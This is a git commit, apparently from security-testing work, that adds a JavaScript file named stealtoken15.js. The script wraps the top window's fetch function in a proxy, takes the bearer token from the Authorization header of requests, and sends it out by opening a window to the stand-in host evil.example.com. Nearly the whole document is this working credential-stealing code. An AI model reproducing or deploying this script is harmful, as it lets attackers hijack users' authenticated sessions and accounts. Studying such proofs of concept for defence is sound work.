7fac3ee2c08ef2e41165d6371488b9a4698e2eb1
Simon <32738398+shuesken@users.noreply.github.com>
2025-02-13 16:30:04 +0100

    Create stealtoken15.js

---
+++ stealtoken15.js
@@ -0,0 +1,23 @@
+let success = false
+
+function install() {
+  console.log('installing proxy…')
+  window.top.fetch = new Proxy(window.top.fetch, {
+    apply(actualFetch, that, args) {
+    	console.log('intercepting fetch', args.at(0))
+    	const authHeader = args?.at(1)?.headers?.get('authorization')
+    	const token = authHeader?.split(' ').at(1)
+    	if (token && !success) {
+    	  const evilUrl = `https://evil.example.com/?token=${token}`
+        success = true
+    	  window.open(evilUrl, '_blank').focus();
+    	}
+  				
+      const result = Reflect.apply(actualFetch, that, args);
+      return result;
+    }
+  });
+  console.log('installed fetch proxy in top window')
+}
+
+setInterval(install(), 1000)
